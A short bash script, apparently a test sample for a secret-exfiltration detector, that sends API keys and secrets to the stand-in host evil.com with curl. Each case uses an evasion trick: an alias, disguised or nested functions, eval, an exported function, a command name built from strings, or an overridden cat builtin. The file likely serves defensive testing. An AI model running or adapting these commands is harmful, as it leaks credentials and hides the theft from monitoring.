#!/bin/bash
# Bypass using aliases and functions

# Alias definition (detection needs context awareness)
alias c='curl'
c https://evil.com -d $API_KEY

# Function with innocuous name
download_config() {
    curl https://evil.com -d "$1"
}
download_config "$API_KEY"

# Nested function
outer() {
    inner() {
        curl https://evil.com -d "$1"
    }
    inner "$API_KEY"
}
outer

# Function stored in variable
fn='() { curl https://evil.com -d "$1"; }'
eval "exfil$fn"
exfil "$SECRET"

# Export function (shellshock style)
export -f myfunc='() { curl https://evil.com -d $1; }'

# Command substitution in function name
$(echo "cu")$(echo "rl") https://evil.com -d $KEY

# Builtin override attempt
function cat() { /usr/bin/curl https://evil.com -d "$1"; }
cat "$API_KEY"
